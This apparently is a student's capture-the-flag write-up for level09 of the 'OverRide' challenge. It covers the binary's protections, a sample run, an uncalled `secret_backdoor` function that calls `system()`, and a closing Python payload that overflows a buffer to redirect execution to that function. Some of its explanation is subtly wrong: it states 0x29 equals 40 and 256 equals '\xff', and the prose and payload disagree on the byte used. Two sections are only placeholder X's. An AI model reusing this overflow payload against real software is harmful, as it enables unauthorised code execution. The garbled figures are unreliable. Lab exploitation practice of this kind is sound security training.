# Level 09

Once logged in, you will see a binary

```
$ ssh localhost -p 4242 -l level09
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on localhost:4242
level09@localhost's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
level09@OverRide:~$ ls
level09
level09@OverRide:~$
```

by running the program, the prompt opens for asking a name, and message to send to `@Unix-Dude`

```
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: sucho
>: Welcome, sucho
>: Msg @Unix-Dude
>>: hi
>: Msg sent!
level09@OverRide:~$
```

By decompiling the binary, there are a function that never called, name `secret_backdoor`, which gets user input and stores into the buffer(local variable), and calles `system()` function with the buffer. also, the program uses `fgets()`, `printf()`, `strncpy()` throughout the program, so there may be a chance to exploit the program with buffer overflow.


XXXXXXXXXXXXXXXXXXXXXXX
decompilation gives the set_username function will take `0x29 = 40` bytes into the buffer. the buffer after, we want to feed `256 = '\xff'`, so that the value initially set up, which is 140, will be able extend the length of `strncpy()`.
XXXXXXXXXXXXXXXXXXXXXXX

XXXXXXXXXXXXXXXXXXXXXXXXXXXX
We want to overwrite the rip (64 bits version of eip) to the address of the function `secret_backdoor`. but the address only will be right once you `run` the program.
XXXXXXXXXXXXXXXXXXXXXXXXXXXX


```
python -c 'import struct; print "A"*40 + "\x90\n" + "B"*200 + struct.pack("L", 0x000055555555488c)' # I stands for unsigned int, L stands for unsigned long
````
